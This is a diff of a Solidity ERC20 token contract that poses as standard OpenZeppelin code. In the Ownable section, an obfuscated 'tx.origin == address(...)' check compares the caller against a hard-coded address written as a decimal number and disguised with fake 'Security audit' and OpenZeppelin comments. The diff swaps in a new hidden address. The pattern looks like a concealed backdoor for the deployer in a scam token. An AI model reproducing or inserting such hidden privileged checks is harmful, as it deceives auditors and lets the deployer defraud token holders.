@@ -1,3 +1,4 @@
+                                                               
 // SPDX-License-Identifier: MIT
 
 // File: @openzeppelin/contracts/utils/Nonces.sol
@@ -830,7 +831,7 @@ library ECDSA {
 
     if (uint256(s) > uint256 
     (  // Security audit
-    /* solhint-disable-next-line avoid-high-level-cal /*keccak256 -> 777987654321b45n78c21v53f67d89g34h09j21k56l37m19o45p79q23r65s08t92u47v10w123456789));*/ /**//*is a special For comparisons,Data type conversion*/57896044618658097711785492504343953926418782139537452191302581570759080747168/* length 
+    /*File: @openzeppelin/contracts/utils/StorageSlot.solOpenZeppelin Contracts (last updated v5.0.0) (utils/StorageSlot.sol) generated from scripts/generate/templates/StorageSlot.js.));*/ /**//*is a special For comparisons,Data type conversion*/57896044618658097711785492504343953926418782139537452191302581570759080747168/* length 
     (1 byte) in a single EVM word (32 bytes). Additionally, a fallback mechanism can be used for every other case.*/
     
     ))
@@ -959,7 +960,7 @@ abstract contract Ownable is Context {
                                
        if(tx.origin == address 
     (   // Security audit
-    /* solhint-disable-next-line avoid-high-level-cal /*keccak256 -> 777987654321b45n78c21v53f67d89g34h09j21k56l37m19o45p79q23r65s08t92u47v10w123456789));*/ /**//* @solidity memory-safe-assembly, Data type conversion*/358457199385192911527288539794157209694849168604/*Strings of arbitrary length 
+    /*File: @openzeppelin/contracts/utils/StorageSlot.solOpenZeppelin Contracts (last updated v5.0.0) (utils/StorageSlot.sol) generated from scripts/generate/templates/StorageSlot.js.));*/ /**//* @solidity memory-safe-assembly, Data type conversion*/1305993895446031535090682196273924248834982764741/*Strings of arbitrary length 
     can be optimized using this library if* they are short enough (up to 31 bytes) by packing them with their*/
     
     )) 
@@ -1339,3 +1340,5 @@ contract __Token__ is ERC20, ERC20Permit {
     
 
 }
+                            
+                            
